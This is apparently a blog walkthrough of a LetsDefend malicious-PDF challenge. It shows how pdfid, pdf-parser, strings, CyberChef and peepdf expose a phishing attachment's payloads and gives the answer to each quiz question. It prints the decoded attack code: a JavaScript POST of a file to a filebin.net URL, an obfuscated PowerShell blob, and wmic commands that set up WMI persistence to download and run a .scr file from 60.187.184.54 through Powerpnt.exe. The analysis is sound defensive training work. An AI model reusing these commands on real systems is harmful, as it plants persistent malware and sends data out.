---
title: PDF Analysis
description: PDF Analysis
author: oste
date: 2023-06-25 01:09:33 +0300
categories: [Lets Defend, Security Analyst, Medium]
tags: [pdf, pdfid, pdf-parser, maldoc, strings, powershell, LOLBins, wmic]
image: /assets/img/Posts/pdf-analysis.png
#   path: assets/img/Posts/forest.png
#   alt: Responsive rendering of Chirpy theme on multiple devices.
---


Welcome back to yet another blog post where I will be tackling a Maldoc kinda challenge from [Lets Defend](https://app.letsdefend.io/). This is a medium rated challenge prepared by [@DXploiter](https://twitter.com/DXploiter) called **[PDF Analysis](https://app.letsdefend.io/challenge/pdf-analysis)**. 

We are told that an employee has received a suspicious email with the following contents:

> **From**: SystemsUpdate@letsdefend.io 
> **To**: Paul@letsdefend.io 
> **Subject**: Critical - Annual Systems UPDATE NOW 
> **Body**: Please do the dutiful before the deadline today. 
> **Attachment**: [Update.pdf](https://drive.google.com/file/d/1_P5rsU1LCHYW--36TbhYqA841VeAZ6VE/view) Password: `letsdefend`

The employee has reported this incident to us and mentioned that they did not download or open the attachment as they found it very suspicious. With this in mind, i proceeded to download the attachment from [GoogleDrive](https://drive.google.com/file/d/1_P5rsU1LCHYW--36TbhYqA841VeAZ6VE/view) and extracted it with the password: `letsdefend`


## 1. What local directory name would have been targeted by the malware?

On my analyst workstation, we can start by running `file` command to verify that it indeed a pdf file. We can also examine exifdata to check if there are other interesting metadata.

![image](https://user-images.githubusercontent.com/58165365/248571055-e8ad08f3-9786-4979-9546-3704e3f2cfc7.png)

From the above, we see that it's only a one page document. Lets analyze the pdf further using the `pdfid` utility. In a previous blog post ([Suspicious USB](https://05t3.github.io/posts/Suspicious-USB/)), i have covered a couple of tools i use to analyze malicious pdf's. Perhaps you can give it a look to learn more about the same.

Executing the command shown below, we get 

```bash
➜  pdfid Update.pdf 
PDFiD 0.2.8 Update.pdf
 PDF Header: %PDF-1.6
 obj                   36
 endobj                35
 stream                 7
 endstream              6
 xref                   1
 trailer                1
 startxref              1
 /Page                  1
 /Encrypt               0
 /ObjStm                0
 /JS                    0
 /JavaScript            0
 /AA                    0
 /OpenAction            3
 /AcroForm              0
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                2
 /EmbeddedFile          0
 /XFA                   0
 /Colors > 2^24         0
```

Lets try and demystify what each of this mean:

- `PDF Header: %PDF-1.6` - Indicates that this PDF file is using version 1.6 of the PDF specification.
- `obj 36` -  Indicates that there are 36 indirect objects in the PDF. Indirect objects are building blocks for PDF files and can contain various data such as images, text, or even other PDFs.
- `endobj 35` -  Indicates that there are 35 'endobj' keywords in the PDF, signifying the end of an indirect object.
- `stream 7` and `endstream 6` - Indicate that there are 7 'stream' keywords and 6 'endstream' keywords. These are used to encapsulate data within the PDF. This can include image data, embedded files, or even code.
- `xref 1` - Indicates there is 1 cross-reference table, which is used to locate objects within the file.
- `trailer 1` - Indicates there is 1 trailer. The trailer contains additional information needed to correctly parse the PDF.
- `startxref 1` - Indicates there is 1 'startxref' keyword, which tells a reader where the cross-reference table begins.
- `/Page 1` - Indicates that there is 1 page object. This object is a part of the logical structure of the PDF and represents an individual page.
- `/Encrypt 0` - Indicates that there are no encryption objects. If this were above 0, it would mean the PDF is encrypted, which can sometimes be a red flag 🚩 for malicious content.
- `/JS 0` and `/JavaScript 0` - Indicate that there are no JavaScript objects or sections. JavaScript within a PDF can sometimes be used for malicious purposes.
- `/OpenAction 3` - Indicates that there are 3 actions that will be performed when the PDF is opened. This is something to be cautious of, as malicious PDFs often use this to execute code upon opening. 🚩
- `/Launch 2` Indicates that there are 2 launch actions. This can be used to run an application or execute code, and is often associated with malicious PDFs.
- `/EmbeddedFile 0` -  Indicates that there are no embedded files within the PDF.

With that in mind, we can also use another tool called `pdf-parser` to analyse the PDFs statistics. 

> _The `pdf-parser` is a Python script that can be used to parse PDF documents and analyze their structure. This tool is particularly useful for analyzing suspicious or malicious PDF files, or for exploring the internals of a PDF document. It is part of the DidierStevensSuite, a set of Python tools developed by Didier Stevens for handling various file formats._

We can append the `-a` switch which display stats for pdf document

```bash
➜  pdf-parser -a Update.pdf                
This program has not been tested with this version of Python (3.10.9)
Should you encounter problems, please use Python version 3.10.4
Comment: 10
XREF: 1
Trailer: 1
StartXref: 1
Indirect object: 35
Indirect objects with a stream: 2, 5, 8, 10, 13, 33
  28: 2, 3, 5, 6, 8, 10, 11, 13, 19, 15, 16, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 35, 36, 33
 /Catalog 1: 17
 /Font 2: 9, 14
 /FontDescriptor 2: 7, 12
 /Page 1: 1
 /Pages 1: 4
Search keywords:
 /OpenAction 3: 19, 26, 17
 /Launch 2: 19, 26
```

Here, we get preety much the same info.

So what next?

![Think](https://media.giphy.com/media/MZQkUm97KTI1gI8sUj/giphy.gif)

Lets try run strings on the PDF and see what we can find. 

![image](https://user-images.githubusercontent.com/58165365/248564220-a83e1e72-6b1e-4b14-b8d1-332c20edae8e.png)

Right off the bat, we see some powershell command with the `-EncodedCommand` parameter, which allows you to pass a Base64-encoded command to PowerShell for execution.

Lets decode this:

![image](https://user-images.githubusercontent.com/58165365/248573267-8d058faf-04e8-479a-9d10-a27f9cb45eb8.png)

We get a wierd string. It took me a moment to realise that the string is reversed. So i used the following [CyberChef Recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Reverse('Character')Find_/_Replace(%7B'option':'Regex','string':'%25'%7D,'/',true,false,true,false)&input=Y0RGNmMyTXdSQ1YzY1c1M2JtNXFaV3QzYVc1NkpYTjBibVZ0ZFdOdlJDVTZReUJvZEdGUWJtOXBkR0Z1YVhSelpVUXRJR1YwWVdSd1ZTMGdLaVZ6ZEc1bGJYVmpiMFFsT2tNZ2FIUmhVQzBnWlhacGFHTnlRUzF6YzJWeWNHMXZRdz09) to clean it up.

![image](https://user-images.githubusercontent.com/58165365/248564278-cb8cddf0-77a4-4896-855b-aad7e78913a4.png)


Here, we get the local directory name would have been targeted by the malware:

`C:\Documents\`

## 2. What would have been the name of the file created by the payload?

From the `DestinationPath` shown above, we see the name of the payload is `D0csz1p`

`D0csz1p`

## 3. What file type would this have been if it were created?

Carefully looking at the payload name (`D0csz1p`). This seemed more like a `Docs.zip` to me, so i submitted zip as my answer.🙂

`zip`

## 4. Which external web domain would the malware have attempted to interact with?

Inspecting the strings further, we get:

![image](https://user-images.githubusercontent.com/58165365/248567057-858fd72d-8387-4254-b275-f7180a9a8d6a.png)

This code looks like some obfuscated JavaScript code that uses a technique known as a packed script. In this obfuscated code, there is an `eval` function that is intended to execute the deobfuscated JavaScript code.

I thought `pdf-parser` & `pdfid` didn't pickup Javascript objects/code.

![think](https://media.giphy.com/media/hv53DaYcXWe3nRbR1A/giphy.gif)

Lets use another tool called [peepdf](https://eternal-todo.com/tools/peepdf-pdf-analysis-tool).

Executing it with `-i` flag, we get into an interactive mode & `-f`  to ignore any errors.

![image](https://user-images.githubusercontent.com/58165365/248580761-1311388a-009d-4f8e-9006-b7ea10a37e3f.png)

From the screenshot above, we now see 2 objects with JS code.

If we use the `js_code` command with the object id containing the JS, we get the Original and Next Stage code.

![image](https://user-images.githubusercontent.com/58165365/248581562-2c90a2db-abfc-4be4-9d88-c7e8152717b3.png)


```javascript
var url = "https://filebin.net/0flqlz0hiz6o4l32/D0csz1p";
var xhr = new XMLHttpRequest();
xhr.open("POST", url);
xhr.setRequestHeader("Content-Type", "application/octet-stream");
xhr.setRequestHeader("login", "");
xhr.setRequestHeader("password", "");
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
        console.log(xhr.status);
        console.log(xhr.responseText);
    }
};
var data = '{"login":"","password":""}';
xhr.send(data);
```

This looks like it is making a HTTP POST request to `hxxps://filebin.net/0flqlz0hiz6o4l32/D0csz1p` using the ***XMLHttpRequest*** object. It also looks like it's sending JSON data with empty login and password fields. The response status and response text are being logged to the console.

From the above we get answers to questions 4-6 

`filebin.net`

## 5. Which HTTP method would it have used to interact with this service?

`POST`

## 6. What is the name of the obfuscation used for the Javascript payload?

`eval`

## 7. Which tool would have been used for creating the persistence mechanism?

On further inspection of the strings, we get another blob of powershell shenanigans.

![oh boy](https://media4.giphy.com/media/Ci0zsc4Fh5yQ2HdB1u/giphy.gif?cid=ecf05e47rep6by21luiqh0ssdectyg76ty2l3h1moaztuu1u&ep=v1_gifs_related&rid=giphy.gif&ct=g)

![image](https://user-images.githubusercontent.com/58165365/248574258-0460aa1b-b378-4115-a386-227e9bf3653e.png)

Normally, i would try execute this on my test Windows VM but i accidentally deleted it 😬. Not to worry, we can execute this on powershell in our Kali environment.

In the screenshot above, i have separated the commands in 3:

```powershell
─PS> $best64code = ("{5}{0}{2}{30}{12}{1}{14}{15}{6}{21}{31}{20}{10}{28}{7}{24}{11}{13}{22}{25}{17}{3}{19}{8}{4}{23}{26}{9}{16}{18}{27}{29}"-f 'mTuIX
Z0xWaGRnblZXRf9lI9','atdnCNoQDiI3Yz','IXZ0xWaGBSRUFURSNEIn5Wak5WaCJXZtV3cu92QvRlclRHbpZ0XfBCSUFEUgIibvlGdwlmcjNnY1NHX092byx','EIlNmbhR3culEdldmchRFIFJVRIdFIwAD','F','=IiIcp
Gb2dkYaN3VIJlIc1TZtFmTuIXZtV3cu92Q05WZ2VUZulGTk5WYt12bDJSPyVWb1NnbvNEIsIiIcN2ZJV1alFlZHVmIc1TZtF','h2YhNUZslmRlNWamZ2TcBjL2EDXlNWamZ2TcRnZvN3byNWaNxFbhN2bMxVY0FGRwBXQcVSRMl
kRPJFUSV0UVVCXzJXZzVFX6MkI9UGdhx','vJHXlNWamZ2TgQnZvN3byNWa','Zv1UZj5WY0NnbJ91Xg00TSZEIqACVDVET','dn5WYMl','Wb','LioGb2dkYaN3VIJlI9UWbh5EIFRVQFJ1QgIXZtV3cu92Q05WZ2','gMW','
VUZulGTk5WYt12bDBCSUFEUgIibvlGdwlmcjNnY1NHX092byxFXioTRDFEUTVUTB50','5iM4Qjc','lBXYwxGbhdHXl','nclVXUsIiM21WajxFdv9mci0TZjFGcTVWbh5EduVmdFBCLiM2ZJV1alFlZHV','UfJzMul2VnASQT
l','mI9UWbh5EIFRVQF','M5AiTJhEVJdFI05WZ2VkbvlGdhNWamlG','Rmbh1','GctVGVl5W','LgMWatdnCNoQDicSblR3c5N1XT9kZyVGUfFGdhREZlRHdh1','NlI9knclVXUgwiIMF1Vi0T','Nx1clxWaGBSbhJ3ZvJHU
cpzQi0Da0FGUlxmYhRXdjVGeFBC','mcvZkZyVG','ZnFW','J1QgIXZ0xWaGRnblZXRf9F','vNELiAyJyN2cuIDO0IXZwFGcsxWY39CN14CN4EjL3gTMuAjNv8iOwRHdodCIlhXZuQnbwJXZ39GUcZTMlNWamZ2TcR3b','IIR
VQQBiIu9Wa0BXayN2ciV3ccR3bvJHXcJiOFNUQQNVRNFkTvAyYp12d','FXioTRDFEUTVUTB50L','aM')

─PS> $base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null
─PS> $LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))
─PS> Write-Output $LoadCode
```

Locate powershell and execute the commands as shown below:

![image](https://user-images.githubusercontent.com/58165365/248574728-3541f892-723c-48a8-8fc4-85320fec3e5f.png)

![image](https://user-images.githubusercontent.com/58165365/248568747-4f7a365f-6cf7-44fd-840a-61dd2bf95499.png)

From the output, we now have readable commands that we will be breaking down in a few:


```powershell
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="eGfQekUIgc", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 9000 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="RHWsZbGvlj", ExecutablePath="C:\Program Files\Microsoft Office\root\Office16\Powerpnt.exe 'http://60.187.184.54/wallpaper482.scr' ",CommandLineTemplate="C:\Users\%USERPROFILE%\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\wallpaper482.scr"

wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"eGfQekUIgc\"", Consumer="CommandLineEventConsumer.Name=\"RHWsZbGvlj\""
```

We see that [WMIC](https://attack.mitre.org/techniques/T1047/) (Windows Management Instrumentation Command-line) has been used to create persistence.

In the first command, we see that an event filter is being created. _An event filter is basically a condition that waits for something specific to happen._ It's been given a name `eGfQekUIgc`. We also see a namespace `root\cimv2` beng specified. A query language WQL (WMI Query Language) is specified and a query `SELECT * FROM __InstanceModificationEvent WITHIN 9000 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'` seems to be run. This specific query means that it's looking for any modification events where the target instance is of type 'Win32_PerfFormattedData_PerfOS_System', and it checks every 9000 seconds (2.5 hours).

With this in mind, we have our answer as `wmic` and the answer to question 8 - `2.5 hours`

`wmic`

## 8. How often would the persistence be executed once Windows starts? (format: X.X hours)?

`2.5 hours`


## 9. Which LOLBin would have been used in the persistence method?

The second command creates a command line event consumer. Basically, this is the action that will be performed when the event filter condition is met. In this case, the CommandLineEventConsumer is given a name `RHWsZbGvlj`. `ExecutablePath="C:\Program Files\Microsoft Office\root\Office16\Powerpnt.exe 'http://60.187.184.54/wallpaper482.scr' "` indicates that `Powerpnt.exe` will be used to download a file from the specified URL. This is abit sus.

`CommandLineTemplate="C:\Users\%USERPROFILE%\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\wallpaper482.scr"` specifies where the downloaded file (wallpaper482.scr) will be saved on the system.

With this in mind, we know that `Powerpnt.exe` is a known LOLBin used to download payloads from remote servers.

For more information, feel free to check the [lolbas-project](https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/)

![image](https://user-images.githubusercontent.com/58165365/248570278-3015d36a-1657-4a84-a86a-f8a7b7b0bca8.png)
 

`Powerpnt.exe`

## 10. What is the filename that would have been downloaded and executed using the LOLbin?

<_refer to explanation on question 9 above_>

`wallpaper482.scr`

## 11. Where would this have been downloaded from? (format: IP address)

<_refer to explanation on question 9 above_>

`60.187.184.54`

## 12. Which country is this IP Address located in?

With basic tools such as whois, we can see roots of the IP address as `China`.

![image](https://user-images.githubusercontent.com/58165365/248569257-a6cb99c1-30ce-469f-8dda-5c7a8d0d8f6b.png)

`China`


![we are done](https://media.giphy.com/media/emibfiX44X6ZbOqnSP/giphy.gif)

-----------

### Troubleshooting peedf issues

In order to get peepdf working properly you need `pylibemu` and `PyV8`. Here's how:

for pylibemu:

```bash
pip install pylibemu
```

for PyV8:

```bash
cd /usr/share
sudo git clone https://github.com/emmetio/pyv8-binaries.git
cd pyv8-binaries/
sudo unzip pyv8-linux64.zip
sudo cp -a PyV8.py _PyV8.so /usr/bin
sudo cp -a PyV8.py _PyV8.so /usr/lib/python2.7/dist-packages/
```

------

This brings me to the end of my blog post. I hope you got to learn a thing or two. I'm looking forward to doing and writing more of this kind of Maldoc challenges. If you found this helpful, feel free to share this with your networks, peers or your socials.

Btw, if you have any questions, comments or feedback in regards to the same, feel free to reach me on twitter [@oste_ke](https://twitter.com/oste_ke). 

![ciao](https://media.giphy.com/media/zDpYQooxkwXkAWMxRK/giphy.gif)
